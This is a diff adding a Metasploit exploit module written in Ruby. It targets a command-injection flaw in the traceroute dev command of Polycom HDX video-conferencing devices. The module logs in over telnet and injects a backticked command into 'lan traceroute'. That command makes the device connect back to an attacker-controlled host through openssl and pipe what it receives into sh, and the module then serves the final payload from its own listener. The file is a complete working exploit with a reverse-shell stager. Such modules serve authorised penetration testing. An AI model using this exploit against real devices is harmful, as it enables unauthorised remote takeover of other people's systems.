@@ -1,0 +1,177 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Polycom Shell HDX Series Traceroute Command Execution',
+      'Description' => %q{
+        Within Polycom command shell, a command execution flaw exists in
+        lan traceroute, one of the dev commands, which allows for an
+        attacker to execute arbitrary payloads with telnet or openssl.
+      },
+      'Author' => [
+        'Mumbai', #
+        'staaldraad', # https://twitter.com/_staaldraad/
+        'Paul Haas <Paul [dot] Haas [at] Security-Assessment.com>', # took some of the code from polycom_hdx_auth_bypass
+        'h00die <mike@shorebreaksecurity.com>' # stole the code, creds to them
+      ],
+      'References' => [
+        ['URL', 'https://staaldraad.github.io/2017/11/12/polycom-hdx-rce/']
+      ],
+      'DisclosureDate' => 'Nov 12 2017',
+      'License' => MSF_LICENSE,
+      'Platform' => 'unix',
+      'Arch' => ARCH_CMD,
+      'Stance' => Msf::Exploit::Stance::Aggressive,
+      'Targets' => [[ 'Automatic', {} ]],
+      'Payload' => {
+        'Space' => 8000,
+        'DisableNops' => true,
+        'Compat' => { 'PayloadType' => 'cmd', 'RequiredCmd' => 'telnet generic openssl'}
+      },
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },
+      'DefaultTarget' => 0
+    ))
+
+    register_options(
+    [
+      Opt::RHOST(),
+      Opt::RPORT(23),
+      OptString.new('PASSWORD', [ false, "Password to access console interface if required."]),
+      OptAddress.new('CBHOST', [ false, "The listener address used for staging the final payload" ]),
+      OptPort.new('CBPORT', [ false, "The listener port used for staging the final payload" ])
+    ])
+  end
+
+  def check
+    connect
+    Rex.sleep(1)
+    res = sock.get_once
+    disconnect
+    if !res && !res.empty?
+      return Exploit::CheckCode::Unknown
+    elsif res =~ /Welcome to ViewStation/ || res =~ /Polycom/
+      return Exploit::CheckCode::Detected
+    end
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    unless check == Exploit::CheckCode::Detected
+      fail_with(Failure::Unknown, "#{peer} - Failed to connect to target service")
+    end
+
+    #
+    # Obtain banner information
+    #
+    sock = connect
+    Rex.sleep(2)
+    banner = sock.get_once
+    vprint_status("Received #{banner.length} bytes from service")
+    vprint_line("#{banner}")
+    if banner =~ /password/i
+      print_status("Authentication enabled on device, authenticating with target...")
+      if datastore['PASSWORD'].nil?
+        print_error("#{peer} - Please supply a password to authenticate with")
+        return
+      end
+      # couldnt find where to enable auth in web interface or telnet...but according to other module it exists..here in case.
+      sock.put("#{datastore['PASSWORD']}\n")
+      res = sock.get_once
+      if res =~ /Polycom/
+        print_good("#{peer} - Authenticated successfully with target.")
+      elsif res =~ /failed/
+        print_error("#{peer} - Invalid credentials for target.")
+        return
+      end
+    elsif banner =~ /Polycom/ # praise jesus
+      print_good("#{peer} - Device has no authentication, excellent!")
+    end
+    do_payload(sock)
+  end
+
+  def do_payload(sock)
+    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
+    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])
+
+    # Start a listener
+    start_listener(true)
+
+    # Figure out the port we picked
+    cbport = self.service.getsockname[2]
+    cmd = "devcmds\nlan traceroute `openssl${IFS}s_client${IFS}-quiet${IFS}-host${IFS}#{cbhost}${IFS}-port${IFS}#{cbport}|sh`\n"
+    sock.put(cmd)
+    if datastore['VERBOSE']
+      Rex.sleep(2)
+      resp = sock.get_once
+      vprint_status("Received #{resp.length} bytes in response")
+      vprint_line(resp)
+    end
+
+    # Give time for our command to be queued and executed
+    1.upto(5) do
+      Rex.sleep(1)
+      break if session_created?
+    end
+  end
+
+  def stage_final_payload(cli)
+    print_good("Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...")
+    cli.put(payload.encoded + "\n")
+  end
+
+  def start_listener(ssl = false)
+    comm = datastore['ListenerComm']
+    if comm == 'local'
+      comm = ::Rex::Socket::Comm::Local
+    else
+      comm = nil
+    end
+
+    self.service = Rex::Socket::TcpServer.create(
+      'LocalPort' => datastore['CBPORT'],
+      'SSL'       => ssl,
+      'SSLCert'   => datastore['SSLCert'],
+      'Comm'      => comm,
+      'Context'   =>
+      {
+        'Msf'        => framework,
+        'MsfExploit' => self
+      }
+    )
+
+    self.service.on_client_connect_proc = proc { |client|
+      stage_final_payload(client)
+    }
+
+    # Start the listening service
+    self.service.start
+  end
+
+  # Shut down any running services
+  def cleanup
+    super
+    if self.service
+      print_status("Shutting down payload stager listener...")
+      begin
+        self.service.deref if self.service.is_a?(Rex::Service)
+        if self.service.is_a?(Rex::Socket)
+          self.service.close
+          self.service.stop
+        end
+        self.service = nil
+      rescue ::Exception
+      end
+    end
+  end
+
+  # Accessor for our TCP payload stager
+  attr_accessor :service
+end
